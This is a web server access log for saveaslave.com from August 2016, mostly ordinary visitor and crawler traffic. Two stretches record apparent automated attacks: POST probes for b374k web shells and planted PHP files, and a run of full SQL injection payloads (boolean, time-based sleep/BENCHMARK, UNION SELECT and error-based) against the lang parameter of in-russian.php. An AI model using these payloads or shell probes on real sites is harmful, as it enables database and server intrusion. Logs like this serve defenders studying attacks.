213.24.125.34 - - [08/Aug/2016:05:27:06 -0700] "GET / HTTP/1.1" 200 89977 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; MAAU; .NET4.0C; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0E; ms-office)" "saveaslave.com"
213.24.125.34 - - [08/Aug/2016:05:27:08 -0700] "GET /css/bootstrap.min.css HTTP/1.1" 200 123578 "http://saveaslave.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "saveaslave.com"
213.24.125.34 - - [08/Aug/2016:05:27:08 -0700] "GET /css/style.css HTTP/1.1" 200 7938 "http://saveaslave.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "saveaslave.com"
213.24.125.34 - - [08/Aug/2016:05:27:08 -0700] "GET /gfeedfetcher.js HTTP/1.1" 200 9018 "http://saveaslave.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "saveaslave.com"
213.24.125.34 - - [08/Aug/2016:05:27:08 -0700] "GET /assets/js/ie-emulation-modes-warning.js HTTP/1.1" 200 2130 "http://saveaslave.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "saveaslave.com"
213.24.125.34 - - [08/Aug/2016:05:27:09 -0700] "GET /gajaxscroller.js HTTP/1.1" 200 9774 "http://saveaslave.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "saveaslave.com"
213.24.125.34 - - [08/Aug/2016:05:27:09 -0700] "GET /images/logo2.png HTTP/1.1" 200 18525 "http://saveaslave.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "saveaslave.com"
213.24.125.34 - - [08/Aug/2016:05:27:09 -0700] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 200 641 "http://saveaslave.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "saveaslave.com"
213.24.125.34 - - [08/Aug/2016:05:27:10 -0700] "GET /images/social2.png HTTP/1.1" 200 1752 "http://saveaslave.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "saveaslave.com"
213.24.125.34 - - [08/Aug/2016:05:27:10 -0700] "GET /images/social3.png HTTP/1.1" 200 4343 "http://saveaslave.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "saveaslave.com"
213.24.125.34 - - [08/Aug/2016:05:27:10 -0700] "GET /indicator.gif HTTP/1.1" 200 878 "http://saveaslave.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "saveaslave.com"[0]
213.24.125.34 - - [08/Aug/2016:05:27:15 -0700] "GET /favicon.ico HTTP/1.1" 404 89 "http://saveaslave.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "saveaslave.com"
213.24.125.34 - - [08/Aug/2016:05:27:15 -0700] "GET /ico/favicon-16x16.png HTTP/1.1" 200 1129 "http://saveaslave.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "saveaslave.com"
213.24.125.34 - - [08/Aug/2016:05:27:16 -0700] "GET /ico/favicon-96x96.png HTTP/1.1" 200 4476 "http://saveaslave.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "saveaslave.com"
213.24.125.34 - - [08/Aug/2016:05:27:16 -0700] "GET /ico/favicon-32x32.png HTTP/1.1" 200 1892 "http://saveaslave.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "saveaslave.com"
213.24.125.34 - - [08/Aug/2016:05:27:16 -0700] "GET /ico/android-icon-192x192.png HTTP/1.1" 200 10097 "http://saveaslave.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "saveaslave.com"
2.29.133.239 - - [08/Aug/2016:05:32:17 -0700] "GET /images/top.jpg HTTP/1.1" 200 50519 "https://www.google.co.uk/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "www.saveaslave.com"
180.76.15.25 - - [08/Aug/2016:05:45:40 -0700] "GET /?tpl=hospitals&Itemid=11&countrycode HTTP/1.1" 200 89977 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "www.saveaslave.com"[1]
79.137.180.251 - - [08/Aug/2016:05:48:17 -0700] "GET /our-supporters.php HTTP/1.1" 200 55478 "http://www.saveaslave.com/our-supporters.php" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36" "www.saveaslave.com"[0]
208.115.113.86 - - [08/Aug/2016:05:58:23 -0700] "GET /robots.txt HTTP/1.1" 200 48 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "saveaslave.com"
46.119.112.163 - - [08/Aug/2016:06:10:21 -0700] "GET / HTTP/1.1" 200 89941 "http://na-telefon.biz/po-imenam.html" "Opera/8.01 (Windows NT 5.1)" "saveaslave.com"
46.119.112.163 - - [08/Aug/2016:06:10:22 -0700] "GET / HTTP/1.1" 200 89941 "http://na-telefon.biz/po-imenam.html" "Opera/8.01 (Windows NT 5.1)" "saveaslave.com"
46.119.112.163 - - [08/Aug/2016:06:10:23 -0700] "GET / HTTP/1.1" 200 89941 "http://na-telefon.biz/po-imenam.html" "Opera/8.01 (Windows NT 5.1)" "saveaslave.com"
134.249.65.218 - - [08/Aug/2016:06:10:48 -0700] "GET / HTTP/1.1" 200 89941 "http://lostfilm-online.ru/" "Opera/9.0 (Windows NT 5.1; U; en)" "saveaslave.com"
134.249.65.218 - - [08/Aug/2016:06:10:49 -0700] "GET / HTTP/1.1" 200 89941 "http://lostfilm-online.ru/" "Opera/9.0 (Windows NT 5.1; U; en)" "saveaslave.com"
66.220.158.108 - - [08/Aug/2016:06:27:01 -0700] "GET /images/cover1.jpg HTTP/1.1" 200 253658 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "saveaslave.com"
100.43.85.25 - - [08/Aug/2016:06:27:19 -0700] "GET /robots.txt HTTP/1.1" 200 48 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "saveaslave.com"
141.8.143.182 - - [08/Aug/2016:06:27:28 -0700] "GET /images/logo2.png HTTP/1.1" 200 18525 "-" "Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)" "saveaslave.com"
164.132.161.71 - - [08/Aug/2016:06:30:16 -0700] "GET /gabon.html HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" "saveaslave.com"
151.80.31.163 - - [08/Aug/2016:06:32:45 -0700] "GET /belarus-ht-2015r HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" "saveaslave.com"
157.55.39.97 - - [08/Aug/2016:06:42:07 -0700] "GET /cyprus.html HTTP/1.1" 404 89 "-" "msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)" "www.saveaslave.com"
157.55.39.97 - - [08/Aug/2016:06:42:08 -0700] "GET /sierra-leone.html HTTP/1.1" 404 89 "-" "msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)" "www.saveaslave.com"
207.46.13.163 - - [08/Aug/2016:06:44:59 -0700] "GET /robots.txt HTTP/1.1" 200 48 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "www.saveaslave.com"
157.55.39.97 - - [08/Aug/2016:06:45:37 -0700] "GET /sao-tome-principe.html HTTP/1.1" 404 89 "-" "msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)" "www.saveaslave.com"
157.55.39.97 - - [08/Aug/2016:06:45:37 -0700] "GET /holy-see.html HTTP/1.1" 404 89 "-" "msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)" "www.saveaslave.com"
157.55.39.97 - - [08/Aug/2016:06:45:37 -0700] "GET /french-polynesia.html HTTP/1.1" 404 89 "-" "msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)" "www.saveaslave.com"[0]
157.55.39.97 - - [08/Aug/2016:06:45:37 -0700] "GET /australia.html HTTP/1.1" 404 89 "-" "msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)" "www.saveaslave.com"
65.36.241.48 - - [08/Aug/2016:06:46:01 -0700] "HEAD / HTTP/1.1" 200 0 "-" "InternetSeer.com" "www.saveaslave.com"
106.120.173.111 - - [08/Aug/2016:06:48:30 -0700] "GET /site/?feed=rss2&cat=190 HTTP/1.1" 404 89 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" "saveaslave.com"
136.243.16.102 - - [08/Aug/2016:06:56:46 -0700] "GET /site/?p=52 HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6 - James BOT - WebCrawler http://cognitiveseo.com/bot.html" "saveaslave.com"[0]
136.243.16.102 - - [08/Aug/2016:06:56:47 -0700] "GET /site/?p=52 HTTP/1.1" 404 89 "nt" "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.10) Gecko/20050716 Thunderbird/1.0.6 - WebCrawler http://cognitiveseo.com/bot.html" "saveaslave.com"[0]
65.36.241.48 - - [08/Aug/2016:07:02:35 -0700] "HEAD /?tpl=references&Itemid=3 HTTP/1.1" 200 0 "-" "InternetSeer.com" "www.saveaslave.com"
146.148.46.199 - - [08/Aug/2016:07:25:13 -0700] "GET / HTTP/1.1" 200 89977 "-" "GuzzleHttp/6.2.1 curl/7.47.0 PHP/7.0.8-0ubuntu0.16.04.2" "saveaslave.com"[2]
208.115.113.86 - - [08/Aug/2016:07:34:34 -0700] "GET /article.php?id=87 HTTP/1.1" 200 776 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "saveaslave.com"
164.132.161.22 - - [08/Aug/2016:08:42:07 -0700] "GET /south-korea.html HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" "saveaslave.com"
151.80.31.164 - - [08/Aug/2016:09:16:07 -0700] "GET /syria.html HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" "saveaslave.com"
66.249.75.110 - - [08/Aug/2016:09:26:20 -0700] "GET /apple-app-site-association HTTP/1.1" 403 255 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "www.saveaslave.com"[0]
17.142.159.177 - - [08/Aug/2016:09:32:55 -0700] "GET / HTTP/1.1" 200 89977 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" "saveaslave.com"
17.142.159.177 - - [08/Aug/2016:09:40:00 -0700] "GET / HTTP/1.1" 200 89977 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" "saveaslave.com"[1]
17.142.159.177 - - [08/Aug/2016:09:40:00 -0700] "GET / HTTP/1.1" 200 89977 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" "saveaslave.com"[0]
221.121.129.2 - - [08/Aug/2016:09:50:21 -0700] "POST /wp-blog-header.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.0; rv:16.0) Gecko/20130722 Firefox/16.0" "saveaslave.com"[0]
221.121.129.2 - - [08/Aug/2016:09:50:26 -0700] "POST /media/b374k-2.8.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.0; rv:16.0) Gecko/20130722 Firefox/16.0" "saveaslave.com"[0]
221.121.129.2 - - [08/Aug/2016:09:50:26 -0700] "POST /wp-conff.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.0; rv:16.0) Gecko/20130722 Firefox/16.0" "saveaslave.com"[0]
221.121.129.2 - - [08/Aug/2016:09:50:27 -0700] "POST /images/b374k-2.8.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.0; rv:16.0) Gecko/20130722 Firefox/16.0" "saveaslave.com"[0]
221.121.129.2 - - [08/Aug/2016:09:50:33 -0700] "POST /wp-content/themes/THEME/error-log.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.0; rv:16.0) Gecko/20130722 Firefox/16.0" "saveaslave.com"
221.121.129.2 - - [08/Aug/2016:09:50:34 -0700] "POST /wp-load.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.0; rv:16.0) Gecko/20130722 Firefox/16.0" "saveaslave.com"[0]
221.121.129.2 - - [08/Aug/2016:09:50:34 -0700] "POST /wpfootes.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.0; rv:16.0) Gecko/20130722 Firefox/16.0" "saveaslave.com"[0]
221.121.129.2 - - [08/Aug/2016:09:50:35 -0700] "POST /wpfoot.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.0; rv:16.0) Gecko/20130722 Firefox/16.0" "saveaslave.com"
221.121.129.2 - - [08/Aug/2016:09:50:35 -0700] "GET /wp-settings.php HTTP/1.1" 200 73 "-" "Mozilla/5.0 (Windows NT 6.0; rv:16.0) Firefox/13.0" "saveaslave.com"
221.121.129.2 - - [08/Aug/2016:09:50:36 -0700] "GET /wp-comments-post.php HTTP/1.1" 200 73 "-" "Mozilla/5.0 (Windows NT 6.0; rv:16.0) Firefox/13.0" "saveaslave.com"
221.121.129.2 - - [08/Aug/2016:09:50:39 -0700] "POST /logsys.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.0; rv:16.0) Gecko/20130722 Firefox/16.0" "saveaslave.com"[0]
221.121.129.2 - - [08/Aug/2016:09:50:40 -0700] "POST /b374k-2.8.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.0; rv:16.0) Gecko/20130722 Firefox/16.0" "saveaslave.com"
221.121.129.2 - - [08/Aug/2016:09:50:40 -0700] "POST /cfiles.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.0; rv:16.0) Gecko/20130722 Firefox/16.0" "saveaslave.com"[0]
221.121.129.2 - - [08/Aug/2016:09:50:41 -0700] "POST /wp-content/b374k-2.8.php HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.0; rv:16.0) Gecko/20130722 Firefox/16.0" "saveaslave.com"
180.76.15.14 - - [08/Aug/2016:09:50:47 -0700] "GET /country.php?name=Armenia&lang=en HTTP/1.1" 200 53269 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "www.saveaslave.com"
157.55.39.109 - - [08/Aug/2016:09:52:51 -0700] "GET /iran.html HTTP/1.1" 404 89 "-" "msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)" "www.saveaslave.com"
164.132.161.74 - - [08/Aug/2016:10:27:56 -0700] "GET /bahamas.html HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" "saveaslave.com"
180.76.15.159 - - [08/Aug/2016:11:16:20 -0700] "GET /images/logo2.ai HTTP/1.1" 200 1114112 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "www.saveaslave.com"
208.115.113.86 - - [08/Aug/2016:11:37:44 -0700] "GET /article.php?id=10 HTTP/1.1" 200 49450 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "saveaslave.com"
65.36.241.48 - - [08/Aug/2016:12:00:49 -0700] "HEAD / HTTP/1.1" 200 0 "-" "InternetSeer.com" "www.saveaslave.com"
208.115.113.86 - - [08/Aug/2016:12:25:27 -0700] "GET /sanmarino HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "saveaslave.com"
151.80.31.105 - - [08/Aug/2016:12:55:11 -0700] "GET /robots.txt HTTP/1.1" 200 48 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" "www.saveaslave.com"
208.115.113.86 - - [08/Aug/2016:13:23:42 -0700] "GET /robots.txt HTTP/1.1" 200 48 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "www.saveaslave.com"
51.255.65.24 - - [08/Aug/2016:13:39:23 -0700] "GET /poland.html HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" "saveaslave.com"
100.43.90.9 - - [08/Aug/2016:13:50:31 -0700] "GET /images/supporters/pacific.jpg HTTP/1.1" 200 8249 "-" "Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)" "saveaslave.com"
180.76.15.5 - - [08/Aug/2016:13:55:13 -0700] "GET /images/aap02076 HTTP/1.1" 200 1114112 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "www.saveaslave.com"[4]
208.115.113.86 - - [08/Aug/2016:14:26:40 -0700] "GET /index.php HTTP/1.1" 200 89977 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "www.saveaslave.com"[2]
65.36.241.48 - - [08/Aug/2016:14:41:48 -0700] "HEAD / HTTP/1.1" 200 0 "-" "InternetSeer.com" "www.saveaslave.com"
66.249.69.131 - - [08/Aug/2016:14:45:20 -0700] "GET /tuvalu HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "saveaslave.com"
207.46.13.163 - - [08/Aug/2016:14:50:11 -0700] "GET /robots.txt HTTP/1.1" 200 48 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "www.saveaslave.com"
23.91.70.119 - - [08/Aug/2016:15:00:37 -0700] "GET /in-russian.php?lang=ru'\" HTTP/1.1" 200 91347 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; ds-66843412; Sgrunt|V109|1|S-66843412|dial; .NET CLR 1.1.4322)" "saveaslave.com"[1]
23.91.70.119 - - [08/Aug/2016:15:00:38 -0700] "GET /in-russian.php?lang=ru HTTP/1.1" 200 93357 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; elertz 2.4.179[128]; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)" "saveaslave.com"
23.91.70.119 - - [08/Aug/2016:15:00:39 -0700] "GET /in-russian.php?lang=ru2121121121212.1 HTTP/1.1" 200 85 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; Sgrunt|V109|1746|S-1740532934|dialno; snprtz|dialno; .NET CLR 2.0.50727)" "saveaslave.com"[1]
23.91.70.119 - - [08/Aug/2016:15:00:39 -0700] "GET /in-russian.php?lang=ru%20and%201%3D1 HTTP/1.1" 200 91347 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; InfoPath.1)" "saveaslave.com"[0]
23.91.70.119 - - [08/Aug/2016:15:00:40 -0700] "GET /in-russian.php?lang=ru%20and%201%3E1 HTTP/1.1" 200 91347 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; InfoPath.1)" "saveaslave.com"
23.91.70.119 - - [08/Aug/2016:15:00:40 -0700] "GET /in-russian.php?lang=ru%27%20and%20%27x%27%3D%27x HTTP/1.1" 200 85 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; elertz 2.4.025; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0)" "saveaslave.com"[0]
23.91.70.119 - - [08/Aug/2016:15:00:40 -0700] "GET /in-russian.php?lang=ru%27%20and%20%27x%27%3D%27y HTTP/1.1" 200 8573 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iOpus-I-M; .NET CLR 1.1.4322)" "saveaslave.com"
23.91.70.119 - - [08/Aug/2016:15:00:40 -0700] "GET /in-russian.php?lang=ru\"%20and%20\"x\"%3D\"x HTTP/1.1" 200 85 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; InfoPath.1)" "saveaslave.com"
23.91.70.119 - - [08/Aug/2016:15:00:41 -0700] "GET /in-russian.php?lang=ru%20AND%201=1 HTTP/1.1" 200 91347 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; SV1; .NET CLR 1.0.3705)" "saveaslave.com"
23.91.70.119 - - [08/Aug/2016:15:00:41 -0700] "GET /in-russian.php?lang=ru HTTP/1.1" 200 85 "-" "Opera/9.27" "saveaslave.com"[0]
23.91.70.119 - - [08/Aug/2016:15:00:41 -0700] "GET /in-russian.php?lang=ru%27%20AnD%20sLeep%283%29%20ANd%20%271 HTTP/1.1" 200 91347 "-" "Opera/9.27" "saveaslave.com"[0]
23.91.70.119 - - [08/Aug/2016:15:00:41 -0700] "GET /in-russian.php?lang=ru%27%26%26sLEEp%283%29%26%26%271 HTTP/1.1" 200 91347 "-" "Opera/9.27" "saveaslave.com"
23.91.70.119 - - [08/Aug/2016:15:00:42 -0700] "GET /in-russian.php?lang=ru%00%27%7C%7CSLeeP%283%29%26%26%271 HTTP/1.1" 200 85 "-" "Opera/9.27" "saveaslave.com"[0]
23.91.70.119 - - [08/Aug/2016:15:00:42 -0700] "GET /in-russian.php?lang=ru%27%20aND%20BeNChMaRK%282999999%2CMd5%28NoW%28%29%29%29%20AnD%20%271 HTTP/1.1" 200 85 "-" "Opera/9.27" "saveaslave.com"
23.91.70.119 - - [08/Aug/2016:15:00:42 -0700] "GET /in-russian.php?lang=ru%27%26%26BeNChMaRK%282999999%2CmD5%28NOW%28%29%29%29%26%26%271 HTTP/1.1" 200 91347 "-" "Opera/9.27" "saveaslave.com"
23.91.70.119 - - [08/Aug/2016:15:00:42 -0700] "GET /in-russian.php?lang=ru999999.1%20union%20select%20unhex(hex(version()))%20--%20and%201%3D1 HTTP/1.1" 200 85 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=none; SV1; snprtz|S04087544802137; .NET CLR 1.1.4322)" "saveaslave.com"
23.91.70.119 - - [08/Aug/2016:15:00:43 -0700] "GET /in-russian.php?lang=ru99999%27%20union%20select%20unhex(hex(version()))%20--%20%27x%27=%27x HTTP/1.1" 200 91347 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=none; FunWebProducts; .NET CLR 1.1.4322)" "saveaslave.com"[1]
23.91.70.119 - - [08/Aug/2016:15:00:43 -0700] "GET /in-russian.php?lang=ru99999%22%20union%20select%20unhex(hex(version()))%20--%20%22x%22=%22x HTTP/1.1" 200 85 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iOpus-I-M; .NET CLR 1.1.4322)" "saveaslave.com"
23.91.70.119 - - [08/Aug/2016:15:00:43 -0700] "GET /in-russian.php?lang=ru%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20and%201%3D1 HTTP/1.1" 200 91347 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=none; FunWebProducts; .NET CLR 1.1.4322)" "saveaslave.com"
23.91.70.119 - - [08/Aug/2016:15:00:44 -0700] "GET /in-russian.php?lang=ru%22%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20%22x%22=%22x HTTP/1.1" 200 91347 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; SV1; .NET CLR 1.0.3705)" "saveaslave.com"
23.91.70.119 - - [08/Aug/2016:15:00:44 -0700] "GET /in-russian.php?lang=ru' HTTP/1.1" 200 91347 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; InfoPath.1)" "saveaslave.com"[0]
77.75.78.166 - - [08/Aug/2016:15:07:40 -0700] "GET /robots.txt HTTP/1.1" 200 48 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" "saveaslave.com"
62.210.143.245 - - [08/Aug/2016:15:22:17 -0700] "GET /robots.txt HTTP/1.1" 200 48 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" "www.saveaslave.com"
62.210.143.245 - - [08/Aug/2016:15:22:20 -0700] "GET /managelink.php HTTP/1.1" 200 1294 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" "www.saveaslave.com"
164.132.161.2 - - [08/Aug/2016:15:25:54 -0700] "GET /cambodia.html HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" "saveaslave.com"
207.155.113.97 - - [08/Aug/2016:15:41:24 -0700] "GET /images/cover1.jpg HTTP/1.1" 200 253658 "http://saveaslave.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G34 Twitter for iPhone" "saveaslave.com"
207.155.113.97 - - [08/Aug/2016:15:41:24 -0700] "GET /images/select-arrow.png HTTP/1.1" 200 1118 "http://saveaslave.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G34 Twitter for iPhone" "saveaslave.com"
207.155.113.97 - - [08/Aug/2016:15:41:24 -0700] "GET /indicator.gif HTTP/1.1" 200 878 "http://saveaslave.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G34 Twitter for iPhone" "saveaslave.com"
208.115.113.86 - - [08/Aug/2016:15:42:31 -0700] "GET /serbia.html HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "www.saveaslave.com"
208.115.113.86 - - [08/Aug/2016:15:42:32 -0700] "GET /togo.html HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "www.saveaslave.com"
65.36.241.48 - - [08/Aug/2016:15:58:14 -0700] "HEAD / HTTP/1.1" 200 0 "-" "InternetSeer.com" "www.saveaslave.com"
208.115.113.86 - - [08/Aug/2016:15:58:43 -0700] "GET /robots.txt HTTP/1.1" 200 48 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "saveaslave.com"
207.46.13.163 - - [08/Aug/2016:16:00:00 -0700] "GET /cameroon HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "www.saveaslave.com"
104.131.147.112 - - [08/Aug/2016:16:15:03 -0700] "GET / HTTP/1.1" 200 89977 "-" "Mozilla/5.0 (compatible; Gluten Free Crawler/1.0; +http://glutenfreepleasure.com/)" "www.saveaslave.com"
74.197.223.209 - - [08/Aug/2016:16:25:57 -0700] "GET / HTTP/1.1" 200 89977 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586" "www.saveaslave.com"
